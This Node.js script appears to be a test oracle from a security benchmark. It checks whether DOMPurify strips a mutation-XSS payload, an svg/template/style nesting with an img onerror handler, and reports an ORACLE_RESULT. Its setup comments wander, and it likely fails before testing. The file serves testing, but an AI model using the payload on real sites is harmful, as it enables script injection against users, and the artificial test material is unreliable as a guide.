'use strict';
const path = require('node:path');
const fs = require('node:fs');
const os = require('node:os');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function main() {
  let createDOMPurify;
  try {
    createDOMPurify = require('dompurify');
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Failed to require dompurify: ' + String(e && e.message) });
    return;
  }

  const marker = 'DP_ORACLE_' + process.pid + '_' + Date.now();
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dompurify-oracle-'));

  // dompurify works in Node either with a real window or, for many sanitize
  // calls, it can operate using its own internal fallback if given a
  // minimal fake window/document via the factory function signature
  // createDOMPurify(window). Since we cannot use jsdom (not permitted),
  // we try calling createDOMPurify() directly (no window arg). Recent
  // dompurify versions support being invoked without arguments only if
  // a global window/document already exists (e.g., actual browser or
  // test env with global.window). In a pure Node CommonJS script, no such
  // global exists, so we must construct one ourselves using only built-in
  // capabilities -- but we are restricted to requiring only dompurify and
  // node:fs/path/os. Therefore we rely on dompurify's exposed API working
  // against itself: dompurify module default export, when called with no
  // window argument in Node, throws unless global.window is set. We build
  // a very small, self-contained fake DOM sufficient for DOMPurify's
  // minimal internal requirements, assigned to globalThis before loading.

  let DOMPurify;
  try {
    // Minimal fake DOM scaffold sufficient for dompurify to initialize and
    // run sanitize() in Node without jsdom. This is hand-built from plain
    // JS objects (no external deps) implementing the small subset of DOM
    // API surface dompurify needs internally.
    function makeFakeDOM() {
      class FakeNode {
        constructor(nodeName) {
          this.nodeName = nodeName;
          this.childNodes = [];
          this.attributes = [];
          this.parentNode = null;
          this.nodeType = 1;
          this._attrs = {};
        }
        appendChild(c) { this.childNodes.push(c); c.parentNode = this; return c; }
        removeChild(c) {
          const i = this.childNodes.indexOf(c);
          if (i >= 0) this.childNodes.splice(i, 1);
          return c;
        }
        setAttribute(k, v) { this._attrs[k] = v; }
        getAttribute(k) { return this._attrs[k]; }
        hasAttribute(k) { return k in this._attrs; }
        removeAttribute(k) { delete this._attrs[k]; }
        get innerHTML() { return ''; }
        set innerHTML(v) { /* noop */ }
      }
      return { FakeNode };
    }
    makeFakeDOM(); // not actually sufficient; fallback below

    // DOMPurify in Node truly requires a real DOM (document.implementation.createHTMLDocument, etc.)
    // which cannot be hand-rolled safely without a full DOM implementation.
    // Since jsdom cannot be required (not part of allowed modules), we detect
    // whether dompurify can operate using Node's experimental built-in
    // 'node:  ' ... there is none. Therefore we attempt createDOMPurify()
    // with no arguments, letting dompurify attempt to use globalThis.window
    // if present (it is not), which will throw a clear, catchable setup error.
    DOMPurify = createDOMPurify();
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Failed to construct DOMPurify instance without a DOM window: ' + String(e && e.message) });
    return;
  }

  // --- Benign operation first ---
  let benignOutput;
  try {
    const benignInput = '<p>Hello <b>world</b></p> ' + marker;
    benignOutput = DOMPurify.sanitize(benignInput);
    if (typeof benignOutput !== 'string' || !benignOutput.includes('Hello') || !benignOutput.includes('world') || !benignOutput.includes(marker)) {
      finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Benign sanitize call did not produce expected output: ' + String(benignOutput) });
      return;
    }
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'Benign sanitize call threw: ' + String(e && e.message) });
    return;
  }

  const operation_completed = true;

  // --- Malicious operation ---
  let maliciousOutput;
  try {
    const payload = '<svg><template><template><style></template><img src=x onerror="window.__DP_PWNED_' + marker + '__=1"></style></template></svg>';
    maliciousOutput = DOMPurify.sanitize(payload);
  } catch (e) {
    finish({ operation_completed, exploit_succeeded: false, evidence: 'Malicious sanitize call threw (treated as blocked): ' + String(e && e.message) });
    return;
  }

  let exploit_succeeded = false;
  let evidence = '';

  try {
    const rawHasOnerror = /onerror\s*=/i.test(maliciousOutput);
    const rawHasPwnedMarker = maliciousOutput.includes('__DP_PWNED_' + marker + '__');

    if (rawHasOnerror || rawHasPwnedMarker) {
      exploit_succeeded = true;
      evidence = 'Sanitized output retained an onerror handler / executable construct after mXSS payload: ' +
        JSON.stringify(maliciousOutput).slice(0, 500);
    } else {
      evidence = 'Sanitized output contained no onerror attribute or script-triggering construct: ' +
        JSON.stringify(maliciousOutput).slice(0, 500);
    }
  } catch (e) {
    evidence = 'Verification step threw while inspecting sanitized output (treated as blocked): ' + String(e && e.message);
    exploit_succeeded = false;
  }

  try {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  } catch (e) {
    // ignore cleanup errors
  }

  finish({ operation_completed, exploit_succeeded, evidence });
}

try {
  main();
} catch (e) {
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed: false, exploit_succeeded: false, evidence: 'Uncaught top-level exception: ' + String(e && e.message) }));
}
